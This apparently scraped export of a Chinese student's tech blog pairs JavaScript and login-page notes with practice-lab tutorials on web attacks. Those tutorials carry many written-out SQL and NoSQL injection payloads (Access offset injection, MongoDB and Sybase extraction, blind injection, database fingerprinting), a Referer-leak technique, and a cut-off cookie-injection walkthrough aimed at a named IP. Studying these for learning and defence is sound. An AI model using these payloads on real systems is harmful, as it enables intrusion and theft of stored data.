布尔型转为其他类型 转为字符型：”true” 或 “false”转为数字型：0,1其他类型转为布尔型：使用Boolean()。 0,null,undefined,空字符串 –&gt; false ， 其它的都是true。如：Boolean(“”) –&gt; falseBoolean(“ggy”) –&gt; true 隐式转换 数字+字符串，数字转为字符串数字+布尔型，布尔型转为数字字符串+布尔型，布尔型转为字符串其它运算会将其它类型转为数字 运算符算术运算符 +可以将数字相加，也可以对字符串进行连接。- * / %只用于数字间的计算。 var s = “1”+”1” –&gt; “11”var s = 1 + “2” –&gt; “12” ++、--自增和自减。var s = a++ –&gt; 先s=a, 再a=a+1;var s = ++a –&gt; 先a=a+1, 再s=a; 比较运算符 == &gt; &lt; != &gt;= ===== 是值相等，===要求值与类型都相等。 逻辑运算符 逻辑运算符必须有布尔型，如果一个是布尔型，另一个不是，会将它转为布尔型。逻辑与&amp;&amp;，两个都是true，结果是true。如果一个不是布尔型，当左边为真，返回右边的值；左边为假，返回左边的值。逻辑或||，至少一个是true，结果为true。如果一个不是布尔型，当左边为真，返回左边的值；左边为假，返回右边的值。逻辑非！，将操作数取反。如果不是布尔型，先转换再取反。 条件和赋值运算符 条件运算符,?与:构成。其实就是三目运算符。var s = a&gt;b?a:b;赋值运算符，=构成。var s = 1; s += 1； 运算符优先级","categories":[{"name":"前端学习","slug":"前端学习","permalink":"https://ggyggy666.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Js学习（一）","slug":"Js学习（一）","permalink":"https://ggyggy666.github.io/tags/Js%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"}],"keywords":[{"name":"前端学习","slug":"前端学习","permalink":"https://ggyggy666.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}]},{"title":"综合课程设计--登录页面","slug":"综合课程设计-登录页面","date":"2020-04-25T12:32:10.000Z","updated":"2020-04-25T13:48:44.110Z","comments":true,"path":"2020/04/25/综合课程设计-登录页面/","link":"","permalink":"https://ggyggy666.github.io/2020/04/25/%E7%BB%BC%E5%90%88%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2/","excerpt":"这学期有个综合课程设计的课，需要每个人独立完成一个任务，目的是为了复习利用大一大二所学的东西。有的选了游戏，有的是网络流量监控相关的软件。我选了个电子商务系统的后台管理，4级任务。理由：想学习PHP，然后结合之前学的html+css还有这学期的mysql等，做到明白一个网站后台是怎么完成的。","text":"这学期有个综合课程设计的课，需要每个人独立完成一个任务，目的是为了复习利用大一大二所学的东西。有的选了游戏，有的是网络流量监控相关的软件。我选了个电子商务系统的后台管理，4级任务。理由：想学习PHP，然后结合之前学的html+css还有这学期的mysql等，做到明白一个网站后台是怎么完成的。 这几天写好了登录界面，先总结一下。 背景图片使用一张背景图片 先将body宽、高都调满，然后背景图片需要设置background-size的大小。因为如果图片比浏览器屏幕小或者大了，会出现显示不全或者留有空白，因此需要设置它为100%，铺满屏幕才行。 描述使用了图标和标题描述该网站。 在body中定义一个div，里面是一张图片和一个标题。需要把他们放在左上角并且是一排显示 那么得先设置他们的宽度，然后图片和标题使用float来排成一列。 登录框要把它放在右中部分，需要使用position为absolute,然后使用top和right即可。 然后是用户名和密码这两行，要把这几个字右对齐，需要使用span标签，然后它的样式如下： 需要用到display:inline-block和text-align:right。 以上粗略带过，接着重点将js生成验证码及验证输入部分。 js验证思路首先刚开始的时候验证码部分内容是隐藏的，在第一次点击登录后，会弹出“请输入验证码”，然后验证码位置显现出来，这个时候得稍微调动一下其他输入框的位置。验证码是使用js+canvas画图自动生成的，然后点击canvas框会自动更换验证码。输入验证码后会校验并输出相应信息。并且注意有任何错误（如：验证码错误）需要阻止提交表单，使用return false即可。验证码验证成功后，再调用验证用户名和密码的函数，看是否有非法字符（同样需要return false）。如果验证成功，就提交表单。这里只写如何生成验证码（重点）。 生成验证码前期准备 之所以使用内联样式，是为了防止form中的其它样式对它造成影响。刚开始是隐藏的，即display:none。input框用来输入，canvas生成。p标签用来显示错误信息。span是占位的，为了跟其它输入框一致。input和canvas要在同一行，必须先定义整体宽度，再定义他们两个的宽度然后使用float。其它看代码即可。 核心代码看一下js是怎么生成验证码的。注意需要先定义一个全局变量show_code数组，将每次生成的字符存进去，方便之后验证时比较。 定义各变量var canvas = document.getElementById(&quot;drawCode&quot;); var context = canvas.getContext(&quot;2d&quot;); var canvas_width = document.getElementById(&quot;drawCode&quot;).clientWidth; var canvas_height = document.getElementById(&quot;drawCode&quot;).clientHeight; canvas.width = canvas_width; canvas.height = canvas_height; var codeStr = &quot;A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,0,\\ 1,2,3,4,5,6,7,8,9,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z&quot;; var code = codeStr.join(&quot;&quot;); var len = code.length; var num, x, y, deg;循环随机生成4个字符for(var i=0; i&lt;4; i++){ num = Math.floor(Math.random()*len); show_code[i] = code[num]; deg = (Math.random()*len*Math.PI)/180; x = 10 + i*20; y = 20 + Math.random()*5; context.font = &quot;bold 23px 微软雅黑&quot;; context.translate(x, y); context.rotate(deg); context.fillStyle = randomColor(); context.fillText(code[num], 0, 0); context.rotate(-deg); context.translate(-x, -y); }讲解一下：4个字符需要放在一定的位置和旋转一定的角度。这里是以左上方为标准点。当产生第一个字符后，位置和角度都变了，需要回到原来的左上方标准点。因此后面需要-deg,-x,-y。 画6条线条for(var i=0; i&lt;6; i++){ context.strokeStyle = randomColor(); context.beginPath(); var x = Math.random()*canvas_width; var y = Math.random()*canvas_height; context.moveTo(x, y); context.lineTo(x, y); context.stroke(); }画30个点for(var i=0; i&lt;30; i++){ context.strokeStyle = randomColor(); context.beginPath(); var x = Math.random()*canvas_width; var y = Math.random()*canvas_height; context.moveTo(x, y); context.lineTo(x+1, y+1); context.stroke(); }画点，其实就是长度为1的线条。 实现randomColor()函数function randomColor(){ var r = Math.floor(Math.random() * 256); var g = Math.floor(Math.random() * 256); var b = Math.floor(Math.random() * 256); return &quot;rgb(&quot; + r + &quot;,&quot; + g + &quot;,&quot; + b + &quot;)&quot;; }以上就实现了生成验证码过程。 检验检验验证码就不提了，直接根据id获取值然后比对show_code的内容即可。验证成功后，开始调用检验输入的用户名和密码。这里提一下如何不用id获取表单的值： len1 = document.forms[&quot;login&quot;][&quot;username&quot;].value; len2 = document.forms[&quot;login&quot;][&quot;password&quot;].value;login是form表单的name值，username是input标签的name值。 正则检验要使用到 /正则表达式/.test(要检验的内容)。比如要检验输入的用户名不能有除了数字和字母以外的字符，那么可以使用： /[^A-Za-z0-9]/.test(len1)len1由上面可知，是username的值。^表示取反的意思。 最终效果 当然，验证码还没出现。","categories":[{"name":"前端学习","slug":"前端学习","permalink":"https://ggyggy666.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"综合课程设计--登录页面","slug":"综合课程设计-登录页面","permalink":"https://ggyggy666.github.io/tags/%E7%BB%BC%E5%90%88%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2/"}],"keywords":[{"name":"前端学习","slug":"前端学习","permalink":"https://ggyggy666.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}]},{"title":"Access-偏移注入","slug":"Access-偏移注入","date":"2020-04-16T09:51:18.000Z","updated":"2020-04-16T11:16:05.293Z","comments":true,"path":"2020/04/16/Access-偏移注入/","link":"","permalink":"https://ggyggy666.github.io/2020/04/16/Access-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/","excerpt":"Access数据库需要猜表，猜列名，如果表名猜出来了，但列名却怎么也猜不出来，那么就需要使用偏移注入了。","text":"Access数据库需要猜表，猜列名，如果表名猜出来了，但列名却怎么也猜不出来，那么就需要使用偏移注入了。 偏移注入我把它归结为两类，一个是多表偏移，利用同一张表进行内连接从而达到几张相同的表进行连接的效果；另一个就是逐位偏移了，知道表的字段数后，利用table.*代替该表的字段数逐步偏移。 爆总字段数和某表的字段数首先先用order by爆出字段数，然后使用union select查看哪个字段回显。注意，这里回显的都是显性回显，还可能存在隐形回显（即不显示出来）。假设有26个字段,已知表名是admin，那么union语句如下： ?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin回显了哪几位我们并不关心。接着使用通配符*代替字段位，即： ?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,* from admin ?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,* from admin ... ?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,* from admin就像这样，一直等到20的时候回显正确了，那么说明这个admin表有26-20=6个字段，用*就代替了admin表的六个字段。接下来就用两种方法分别注入。 多表偏移所谓的多表偏移，就是同一张admin表内连接，但是启用了不同的别名，通过这样打乱原来的字段顺序，从而有可能爆出数据。已经知道了admin表字段数为6，那么可以首先使用两表进行偏移，即： ?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,* from (admin as a inner join admin as b on a.id=b.id)可以看到，对同一张admin表，用了两个别名a,b，然后inner join进行内连接，此时*代替的就是两张admin的字段了，即它表示的字段数为12，而原有的字段数是26，因此最终出现的就是到14为止。如果此时还没有数据爆出，可以尝试： ?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,a.id,* from (admin as a inner join admin as b on a.id=b.id)此时*表示的是11个字段了，如果还不行，那么可以继续： ?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,a.id,b.id,* from (admin as a inner join admin as b on a.id=b.id)此时*表示的是10个字段了。如果还不行，就继续偏移：再连接一张admin表，然后向左偏移admin的字段数，即14-6=8，最终： ?id=-1 union select 1,2,3,4,5,6,7,8,* from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id)再连接一张admin表，此时*表示的就是18个字段了，然后同上面的办法将a.id等一个个放进去。即： ?id=-1 union select 1,2,3,4,5,6,7,8,a.id,* from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id) ?id=-1 union select 1,2,3,4,5,6,7,8,a.id,b.id,* from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id) ?id=-1 union select 1,2,3,4,5,6,7,8,a.id,b.id,c.id* from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id)可依次尝试。 逐位偏移与多表偏移不同，逐位偏移只有1张表，并且是每一位都尝试去注入。同样，已经知道了admin表的字段数是6，即： ?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,* from admin这里我们需要使用表名.*(即admin.*)代替*，以表示6位，同时应该使用上原来的21-26位。看下面例子就明白了： ?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,admin.* from admin由于admin.*是6位，必须与20相加等于原来的26位。进行逐位偏移，向左移一位： ?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,admin.*,26 from admin26用上了。继续向左偏移： ?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,admin.*,25,26 from admin ?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,admin.*,24,25,26 from admin ... ?id=-1 union select admin.*,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin一直挪到第一位为止。 直接看源代码我们要爆出的字段名很可能就是代码中输入框的名字。因此可以尝试看input标签中的name属性的值，然后当做列名看是否能成功猜测出来。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"Access-偏移注入","slug":"Access-偏移注入","permalink":"https://ggyggy666.github.io/tags/Access-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/"}],"keywords":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"HTTP Leak漏洞原理及利用","slug":"HTTP-Leak漏洞原理及利用","date":"2020-04-13T12:15:11.000Z","updated":"2020-07-19T10:06:49.013Z","comments":true,"path":"2020/04/13/HTTP-Leak漏洞原理及利用/","link":"","permalink":"https://ggyggy666.github.io/2020/04/13/HTTP-Leak%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/","excerpt":"前几天跟着二向箔安全免费学习了HTTP Leak漏洞，虽然教的是最基础的，但我还是挺艰难的终于学会了。","text":"前几天跟着二向箔安全免费学习了HTTP Leak漏洞，虽然教的是最基础的，但我还是挺艰难的终于学会了。 网上关于的HTTP Leak的文章非常少，少数涉及到的都是直接利用了，并没有具体讲原理啥的，因此学起来很吃力。所幸在学习群里遇到了一个大佬，他学会了之后分享了他的博客文章给我看，再然后自己慢慢就搞懂了。 原理所谓HTTP Leak，其实就是在某个网站中允许请求加载外部资源，在请求过程中通过referer泄露了一些敏感信息。比如：在一个www.xxx.com网站中，允许插入一张图片，我们知道，浏览器处理图片时是先请求访问图片地址，然后将它加载进来。而对于这张图片来说，他收到了浏览器发送给他的一个请求，这个请求中的referer自然就可以获取到了。 因此可以有以下构造思路：插入一张图片后，在上传之前先使用F12修改掉图片的地址，可以改成攻击者接收referer的URL，然后上传。此时上传之后的图片地址就是被修改后的地址，刷新一下网页，浏览器就会请求加载该图片，攻击者就会收到这个请求从而查看是否有敏感信息。 下面我将通过关卡的方式逐步讲解。 第一关有这样一个网站，如果带着有referer的请求去访问它，它就会显示key。https://wwww.exeye.run/http_leak这就是一个类似我们上面所说的攻击者用来接收referer的URL。因此只需要在自己服务器上构造一个网页，内容是加载一个图片，图片地址就是那个接收的网站。由于需要跳转到那个网站，这里还需要构造一个图片链接的形式，如下： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;referer&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=&quot;https://wwww.exeye.run/http_leak&quot;&gt;&lt;img src=&quot;1&quot;&gt;&lt;/a&gt; &lt;/body&gt; &lt;/html&gt; 显示出来了key。这里必须得构造一个图片链接跳转到那个页面才行，如果是直接使用图片，然后加载那个链接不行，那样就看不到回显在页面的key了。 第二关实战试一下。在搜狗问问的回答中上传图片。 点击那里的图片标志，上传一张本地图片后，点击F12修改链接 修改后，然后点击提交答案。再刷新链接，同时在Network查看请求图片的部分。发现并没有那个图片的显示，因此没有请求…还是先不要修改图片链接，直接提交，然后查看请求那个图片的内容吧。 可以发现，请求那个图片的时候把自己的referer也带上了。那么如果图片链接是攻击者提供的URL，那么接收到后怎么才能获取到referer呢。 第三关使用163邮箱与Burp的一个Collaborator功能。 首先打开burp的Collaborator 然后点击“Copy to clipboard”, 就复制了一个域名在剪切板中。 然后打开163邮箱，写信，选择收件人是自己，选择代码模式编辑。 将刚复制得到的域名粘贴在Img的src里面，然后发送邮件（注意：这里的img这么简陋会被过滤掉，因此可以放更多的HTTP Leak上去尝试）。收到后，打开F12的Network，然后再打开邮件 可以看到请求向我们那个域名的内容部分。点开可以看到泄露了信息。 然后打开burp的那个Collabrator，点击Poll now就可以看到请求了。 总的来说，就是一个网站加载外部资源时，从referer泄露了信息。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"HTTP Leak漏洞原理及利用","slug":"HTTP-Leak漏洞原理及利用","permalink":"https://ggyggy666.github.io/tags/HTTP-Leak%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"不同数据库的注入方法(MongoDB、Sybase)","slug":"不同数据库的注入方法-MongoDB、Sybase","date":"2020-04-11T14:00:41.000Z","updated":"2020-04-12T03:27:43.841Z","comments":true,"path":"2020/04/11/不同数据库的注入方法-MongoDB、Sybase/","link":"","permalink":"https://ggyggy666.github.io/2020/04/11/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-MongoDB%E3%80%81Sybase/","excerpt":"本篇开始进行对MongoDB,Sybase数据库的注入研究。","text":"本篇开始进行对MongoDB,Sybase数据库的注入研究。 MongoDB数据库题目地址：https://www.mozhe.cn/bug/detail/YXlRYUJPYk1vQjAreHlweVAyMzVTUT09bW96aGUmozhe 基础知识MongoDB的数据传输是通过jsonp格式来传递的。 db.test.save(); 增 db.test.remove(); 删 db.test.update(); 改 db.test.find(); 查 其中，db是固定的前缀，test是某个数据库名字。MongoDB是一种非关系型的数据库，因此查询、操作语句与SQl语句不同。数据库中保存的记录： { name: &quot;ggy&quot;, info:{ age:19 } }想要更新这条记录，需要执行下列语句： db.test.update({&quot;name&quot;:&quot;ggy&quot;},{&quot;$set&quot;:{&quot;info.age&quot;:66}})都是基于JSON格式的数据进行操作。还有一个excute,就是直接执行字符串的。 操作符介绍$lt -&gt; &lt;; $lte -&gt; &lt;=; $gt -&gt; &gt;; $gte -&gt; &gt;=; $ne -&gt; != $regex运用： db.test.find({&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:{$ne:&quot;1&quot;}})查询name为admin,password不为1的数据，相当于： select * from test where name=&apos;admin&apos; and password !=1因此可以通过更改$ne来进行类似的操作。运用regex: db.test.find({&quot;name&quot;:{&apos;regex&apos;:&quot;^a&quot;}})匹配以a开头的数据。 数组攻击（数字型）有回显从上面的JSON数据可以看出，这个其实跟python的字典一样，不过在这里是相当于数组，键相当于下标，从而可以根据相应下标查询到值。比如： db.test.find({username:&quot;test&quot;,password:&quot;test&quot;})按照上面的说法，就是根据username,password这些下标查询到对应的值，类似于SQL语句： ?username=test&amp;password=testtest这个用户是我们随意编的，肯定不能成功登录。我们从上面{$ne:&quot;1&quot;}知道，可以通过这样来查询出不为1的数据。而要想将这个$ne插进去，就需要用到数组了。比如： ?username[$ne]=test&amp;password[$ne]=test后台查询语句为： db.test.find({username:{&apos;$ne&apos;:&apos;test&apos;},password:&apos;test&apos;})相当于SQL语句： ?username!=test&amp;password!=test这样直接查询出其它用户。（前提有回显） 无回显没有回显就不知道爆出来的其它用户名和密码是什么，因此需要使用regexp一个个匹配。 ?username[$regex]=^a db.test.find({username:{&apos;$regex&apos;:&apos;^a&apos;}})题目writeup:https://www.secpulse.com/archives/1916.html 拼接字符串时的注入（字符型）?username=test&apos;}};return {username:1,password:2}//&amp;password=test应该返回：username:1 password:2 爆所有集合名?username=test&apos;});return {username:tojson(db.getCollectionNames()),password:2};//&amp;password=testdb.getCollectionNames()返回的是数组，因此需要tojson。爆某个集合的第一条数据 test&apos;});return {username:tojson(db.test.find()[0]),password:2};//&amp;password=test第二条： test&apos;});return {username:tojson(db.test.find()[1]),password:2};//&amp;password=test时间盲注test&apos;});if (db.version() &gt; &quot;0&quot;) { sleep(10000); exit; }var b=({a:&apos;1&amp;password=test拼接闭合方式，注释用不了。 布尔型盲注首先加单引号，报错，然后使用： ?news=test&apos;%26%26&apos;1&apos;==&apos;1 （正常） ?news=test&apos;%26%26&apos;1&apos;==&apos;1 （错误）因此是字符型。 爆集合数?news=test&apos;%26%26db.getCollectionNames().length&gt;0%26%26&apos;1&apos;==&apos;1同样是二分法判断出集合数。接着爆集合名称：爆第一个集合名称的长度： ?news=test&apos;%26%26db.getCollectionNames()[0].length&gt;1%26%26&apos;1&apos;==&apos;1爆第一个集合名称的第一个字符： ?news=test&apos;%26%26db.getCollectionNames()[0][0]&gt;&apos;a&apos;%26%26&apos;1&apos;==&apos;1最终得到一个集合名称叫:user爆集合中的第一条数据： ?news=test&apos;%26%26tojson(db.user.find()[0])[0]==&apos;{&apos;%26%26&apos;1&apos;==&apos;1爆出来第一条数据的第一个字符。 ?news=test&apos;%26%26tojson(db.user.find()[0])[1]==&apos;{&apos;%26%26&apos;1&apos;==&apos;1爆出来第一条数据的第二个字符… 挖掘方法题目地址：https://www.mozhe.cn/bug/detail/YXlRYUJPYk1vQjAreHlweVAyMzVTUT09bW96aGUmozhe 探测注入点加单引号回显错误，注释也注释不掉，以为是数字型，发现and 1=1仍然没有正常回显，说明其实还是字符型，或者and和空格被过滤了，不过假设是字符型，注释不了就闭合。如果此时知道是MongoDB数据库，那么在正常页面下F12查看有哪些标签与输出在页面的内容相关。发现有两个div,一个class=”title”,另一个是class=”content”。那么就可以慢慢构造闭合语句。由于是json格式的数据，很可能就是’})或者直接’}，那么可以尝试： ?id=1&apos;};return {&apos;title&apos;:tojson(db),2:&apos;1 ?id=1&apos;});return ({&apos;title&apos;:tojson(db),2:&apos;1有回显的情况下，返回一个数据库名。 爆所有集合名?id=1&apos;});return ({title:tojson(db.getCollectionNames()),2:&apos;1注意，MongoDB区分大小写。 爆某集合的第一条数据?id=1&apos;});return ({title:tojson(db.Authority_confidential.find()[0]),2:&apos;1爆第二条： ?id=1&apos;});return ({title:tojson(db.Authority_confidential.find()[1]),2:&apos;1Sybase数据库Sybase是MSSQL的一个分支，注入方法和MSSQL类似（其实是因为在网上没找到相关文章…）支持union联合查询，having和where not in等语法，但不支持使用TOP，和不同类型的数据直接比较，如：and 1=user，需要使用convert,如：1=convert(integer,user) 判断是否是Sybase数据库and exists(select * from master.dbo.ijdbc_function_escapes)爆版本信息and 1= convert(integer,(select @@version)) ?id=-1 union select 1,&quot;&quot;,(select @@version)爆数据库id=1 and 1=convert(integer,(SELECT MIN(ISNULL(CONVERT(NVARCHAR(4000),gJyQ.name),CHAR(32))) FROM (SELECT name FROM master..sysdatabases) AS gJyQ WHERE CONVERT(NVARCHAR(4000),gJyQ.name)&gt;&apos; &apos;)) 得到第一个库master。 id=1 and 1=convert(integer,(SELECT MIN(ISNULL(CONVERT(NVARCHAR(4000),gJyQ.name),CHAR(32))) FROM (SELECT name FROM master..sysdatabases) AS gJyQ WHERE CONVERT(NVARCHAR(4000),gJyQ.name)&gt;&apos;master&apos;))得到除master外的第一个库，其实类似not in(‘’)的功能。 还有另外一个办法爆库。 and 1=convert(integer,(SELECT name FROM master..sysdatabases where dbid=1))递增bdid的值即可。 爆表名and 1=convert(integer,(select MIN(ISNULL(CONVERT(NVARCHAR(4000),aaaa.name),CHAR(32))) from (select name from test.dbo.sysobjects where type=&apos;U&apos;) AS aaaa where CONVERT(NVARCHAR(4000),aaaa.name)&gt;&apos;&apos;))得到第一个表cmd, 列出除cmd外的第一个表： and 1=convert(integer,(select MIN(ISNULL(CONVERT(NVARCHAR(4000),aaaa.name),CHAR(32))) from (select name from test.dbo.sysobjects where type=&apos;U&apos;) AS aaaa where CONVERT(NVARCHAR(4000),aaaa.name)&gt;&apos;cmd&apos;)) 爆字段1=convert(integer,(select name from test..syscolumns where id=object_id(&apos;users&apos;) and colid=1))递增colid爆其它列名。 爆字段内容1=convert(integer,( select 列名 from 表名 set rowcount 1))因为不支持select top 1 name from xxx（12.5以及之前的版本），使用set rowcount N代替。 写文件、Sybase基础知识等其它操作看后面的参考文章。 参考文章：MongoDB数据库：https://www.cnblogs.com/alummox/p/9665592.htmlhttps://www.secpulse.com/archives/3278.htmlSybase数据库：http://www.vuln.cn/6514","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"不同数据库的注入方法(MongoDB、Sybase)","slug":"不同数据库的注入方法-MongoDB、Sybase","permalink":"https://ggyggy666.github.io/tags/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-MongoDB%E3%80%81Sybase/"}],"keywords":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"判断是哪种数据库类型","slug":"判断是哪种数据库类型","date":"2020-04-11T03:32:31.000Z","updated":"2020-04-11T05:25:22.305Z","comments":true,"path":"2020/04/11/判断是哪种数据库类型/","link":"","permalink":"https://ggyggy666.github.io/2020/04/11/%E5%88%A4%E6%96%AD%E6%98%AF%E5%93%AA%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B/","excerpt":"发现存在SQL注入后，就得首先判断是哪一种数据库。","text":"发现存在SQL注入后，就得首先判断是哪一种数据库。 判断MySQL数据库通过报错信息you have an error in your SQL syntax,check the manual that corrsponds to your mysql server version for the tifht syntax to use near &apos;&apos; at line x通过连接符判断&apos;1&apos;+&apos;1&apos; = &apos;11&apos; (mssql也支持，需要用第二句) concat(&apos;1&apos;,&apos;1&apos;) = &apos;11&apos; &apos;adm&apos; &apos;in&apos; = &apos;admin&apos;（空格就等同于+）通过特有数据表判断and (select count(*) from information_schema.TABLES)&gt;0通过length和char函数判断同时支持length()和char()。len应该也可以。 and len(&apos;a&apos;)=1 （返回正常，MySQL或mssql）通过BENCHMARK函数判断select BENCHMARK(100000,MD5(&apos;ADMIN&apos;))通过@@version和version()判断同时支持@@version和version()，如果version()报错就是mssql。通过注释符/*判断如果/**/返回错误，说明不是MySQL。判断MSSQL数据库通过报错信息Msg 170,level 15, State 1,Line 1 Line 1:Incorrect syntax near ‘foo Msg 105,level 15,state 1,Line 1 Unclose quotation mark before the character string ‘foo或者： Microsoft ODBC Database Engine 错误通过连接符判断&apos;1&apos;+&apos;1&apos; = &apos;11&apos; (MySql也支持）通过特有数据表判断and (select count(*) from sysobjects)&gt;0 （返回正常） and (select count(*) from msysobjects)&gt;0 (返回错误)通过默认变量SERVERNAME判断select @@SERVERNAMW ?id=0/@@SERVERNAME （可能会触发错误报错）通过len函数判断and len(&apos;a&apos;)=1返回正常，可能是mssql,mysql,db2. 通过@@version和version()判断@@version不报错，version()报错。通过substring函数判断substring(&apos;abc&apos;,1,1)=a返回正常，可能是mssql。Oracle只能用substr。 通过注释符–判断使用--返回正常，说明是mssql或者oracle。 ;-- （返回正常，mssql; 错误，基本就是Access）通过sysobjects判断 判断Access数据库通过报错信息Microsoft JET Database Engine错误 &apos;80040e14&apos;通过特有数据表判断and (select count(*) from msysobjects)&gt;0具体看上面MSSQL的图。 通过len和chr函数判断同时支持len()和chr()，且不支持length()和char()通过注释符;–判断使用;--，返回错误，基本可以肯定是Access。判断Oracle数据库通过报错信息判断ORA-01756:quoted string not properly terminated ORA-00933:SQLcommand not properly ended通过连接符判断&apos;1&apos;||&apos;1&apos;=&apos;11&apos; concat(&apos;1&apos;,&apos;1&apos;)=&apos;11&apos;t通过特有数据表判断and (select count(*) from sys.user_tables)&gt;0通过length函数判断可以使用length,不能使用len. len(&apos;a&apos;)=1 （报错）通过substr函数判断只能使用substr,不能用substring。其它数据库可根据使用相应数据库的注入语句一个个测试。如：Postgre的pg_sleep(5), sqlite的sqlite_version()等。 参考文章：https://blog.51cto.com/baiwuya2009/1946358?_adFA0.350332429510239https://blog.dyboy.cn/websecurity/149.htmlhttp://www.51testing.com/html/10/171610-78245.htmlhttps://blog.csdn.net/Wu000999/article/details/88987253https://www.cnblogs.com/Fluorescence-tjy/p/10400588.htmlhttp://ggy.816ym.com/2020/04/01/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95(Access%E3%80%81SQLServer)/","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"判断是哪种数据库类型","slug":"判断是哪种数据库类型","permalink":"https://ggyggy666.github.io/tags/%E5%88%A4%E6%96%AD%E6%98%AF%E5%93%AA%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B/"}],"keywords":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://ggyggy666.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"修改cookie参数进行SQL注入","slug":"修改cookie参数进行SQL注入","date":"2020-04-11T03:20:22.000Z","updated":"2020-04-12T05:35:55.209Z","comments":true,"path":"2020/04/11/修改cookie参数进行SQL注入/","link":"","permalink":"https://ggyggy666.github.io/2020/04/11/%E4%BF%AE%E6%94%B9cookie%E5%8F%82%E6%95%B0%E8%BF%9B%E8%A1%8CSQL%E6%B3%A8%E5%85%A5/","excerpt":"最近在掌控安全的靶场发现了一种我之前不知道的姿势，甚是欣喜。","text":"最近在掌控安全的靶场发现了一种我之前不知道的姿势，甚是欣喜。 以前遇到的Cookie里注入，都是在登录之后出现的uid中，从来没想过可以自己尝试去构造将GET请求的参数挪到cookie中来。下面是详细步骤。题目地址：http://117.167.136.245:10181/ 复现步骤 打开链接，点击页面中的动态新闻。 进去后看到了新闻，看URL： http://117.167.136.245:10181/shownews.asp?id=170存在id=170，那么试一下正常的注入，加单引号后： 发现检测到非法字符就报错了。尝试绕过什么的发现还是不行。因此可以知道，GET型注入行不通。尝试抓包看看Cookie那些行不行。 以前的我看到Cookie中的参数被加密后解密不出来就会放弃，觉得没有任何办法了。现在学会了一种新方法，可以尝试一下。 将URL后面的?id=170去掉，即只剩下： 